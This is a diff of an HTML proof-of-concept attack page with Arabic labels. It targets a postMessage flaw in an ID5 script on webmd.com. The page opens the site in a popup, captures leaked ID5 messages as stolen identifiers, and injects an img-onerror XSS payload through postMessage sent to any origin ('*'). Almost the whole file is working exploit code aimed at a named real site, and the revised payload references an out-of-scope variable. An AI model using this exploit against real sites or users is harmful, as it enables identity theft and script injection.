@@ -1,74 +1,124 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>هجوم Popup - استغلال postMessage</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إثبات اختراق أمني - ثغرة postMessage</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #222; color: #fff; padding: 50px; text-align: center; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 5px; }
-        .log-container { margin-top: 30px; background: #000; padding: 20px; text-align: left; border: 1px solid #444; overflow-y: auto; max-height: 300px; }
-        .success { color: #00ff00; }
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #0d0d0d;
+            color: #00ff00;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            border: 1px solid #333;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+        }
+        h1 { border-bottom: 2px solid #00ff00; padding-bottom: 10px; color: #fff; }
+        .btn {
+            background-color: #ff0000;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1em;
+            display: block;
+            width: 100%;
+            margin: 20px 0;
+            transition: 0.3s;
+        }
+        .btn:hover { background-color: #b30000; box-shadow: 0 0 15px #ff0000; }
+        #log {
+            background-color: #000;
+            border: 1px solid #444;
+            padding: 15px;
+            height: 400px;
+            overflow-y: scroll;
+            font-size: 0.9em;
+            color: #00ff00;
+        }
+        .intercepted-data { color: #ff00ff; font-weight: bold; }
+        .status-msg { color: #aaa; }
     </style>
 </head>
 <body>
-    <h1>اختبار ثغرة postMessage (Popup Mode)</h1>
-    <p>بسبب قيود المتصفح، يجب الضغط على الزر لفتح النافذة وبدء الهجوم:</p>
+
+<div class="container">
+    <h1>هجوم استغلال ثغرة postMessage</h1>
+    <p class="status-msg">هذه الصفحة تقوم بمحاكاة هجوم حقيقي لسحب بيانات المستخدم (Identity Theft) وحقن كود (XSS).</p>
     
-    <button onclick="startExploit()">بدء الهجوم الآن</button>
+    <button class="btn" onclick="launchAttack()">تشغيل الهجوم (Launch Exploit)</button>
 
-    <div class="log-container" id="log">في انتظار بدء الهجوم...</div>
+    <h3>سجل العمليات (Attack Log):</h3>
+    <div id="log">في انتظار بدء الهجوم...</div>
+</div>
 
-    <script>
-        let victimWindow;
+<script>
+    const logBoard = document.getElementById('log');
+    let victimWindow;
 
-        function log(message, isSuccess = false) {
-            const logDiv = document.getElementById('log');
-            const entry = document.createElement('div');
-            entry.className = isSuccess ? 'success' : '';
-            entry.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logDiv.appendChild(entry);
+    function addToLog(msg, isData = false) {
+        const p = document.createElement('div');
+        p.className = isData ? 'intercepted-data' : 'status-msg';
+        p.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBoard.appendChild(p);
+        logBoard.scrollTop = logBoard.scrollHeight;
+    }
+
+    function launchAttack() {
+        // 1. تحديد هدف الضحية (استبدل الرابط بموقع الضحية المصاب)
+        const victimUrl = "https://www.webmd.com"; 
+        
+        addToLog("جاري محاولة فتح نافذة الضحية: " + victimUrl);
+        
+        // 2. فتح النافذة
+        victimWindow = window.open(victimUrl, "VictimWindow");
+
+        if (!victimWindow) {
+            addToLog("!!! خطأ: المتصفح حظر النافذة المنبثقة. يرجى تفعيل Popups.");
+            return;
         }
 
-        function startExploit() {
-            log("جاري فتح نافذة الضحية...");
-            
-            // 1. فتح موقع الضحية في نافذة جديدة
-            victimWindow = window.open("https://www.webmd.com", "VictimSite");
+        addToLog("تم فتح النافذة بنجاح. في انتظار بث البيانات من الكود المصاب...");
 
-            if (!victimWindow) {
-                log("خطأ: تم حظر النافذة المنبثقة! يرجى السماح بالبث المنبثق.");
-                return;
-            }
-
-            // 2. سماع البيانات المسربة (Exfiltration)
-            // بما أن الموقع المصاب يبث الرسائل لكل الـ Openers، سنستلمها هنا
-            window.addEventListener("message", (event) => {
-                if (event.data && event.data._isId5Message) {
-                    log("!!! تم اعتراض بيانات مسربة: " + JSON.stringify(event.data), true);
-                    console.log("Leaked Data:", event.data);
-                }
-            });
-
-            // 3. محاولة حقن الـ XSS بعد مهلة كافية للتحميل
-            log("الانتظار 5 ثوانٍ لتحميل سكربتات الضحية...");
-            setTimeout(() => {
-                log("إرسال Payload الـ XSS...");
+        // 3. مستمع الأحداث لاعتراض الرسائل المسربة
+        window.addEventListener("message", (event) => {
+            // التحقق من أن الرسالة تحمل وسم ID5 المصاب
+            if (event.data && event.data._isId5Message) {
+                addToLog("SUCCESS: تم اعتراض رسالة مسربة!");
+                addToLog("البيانات المستخرجة: " + JSON.stringify(event.data), true);
                 
-                const payload = {
-                    _isId5Message: true,
-                    src: "attacker-id",
-                    type: "PROXY_METHOD_CALL", // النوع المستهدف في الكود المصاب
-                    payload: {
-                        name: "test",
-                        args: ["<img src=x onerror=\"alert('XSS عبر Popup!\\nDomain: ' + document.domain);\">"]
-                    }
-                };
+                // هنا المهاجم يرسل البيانات لسيرفره الخاص
+                console.log("Captured Global ID:", event.data.src);
+            }
+        });
 
-                // إرسال الرسالة إلى النافذة المفتوحة باستخدام "*"
-                victimWindow.postMessage(payload, "*");
-                log("تم إرسال الـ Payload.");
-            }, 5000);
-        }
-    </script>
+        // 4. إرسال الـ Payload المفخخ بعد تحميل الموقع (5 ثوانٍ)
+        setTimeout(() => {
+            addToLog("جاري محاولة حقن الـ Payload (XSS/State Poisoning)...");
+            
+            const payload = {
+                _isId5Message: true,
+                src: "attacker-fake-id",
+                type: "PROXY_METHOD_CALL",
+                payload: {
+                    name: "process",
+                    args: ["<img src=x onerror=\"alert('تم الاختراق!\\nالمجال: ' + document.domain + '\\nالمعرف المسروق: ' + event.data.src);\">"]
+                }
+            };
+
+            // استغلال الثغرة الكبرى (استخدام النجمة *)
+            victimWindow.postMessage(payload, "*");
+            addToLog("تم إرسال الـ Payload عبر القنوات المفتوحة.");
+        }, 5000);
+    }
+</script>
+
 </body>
 </html>
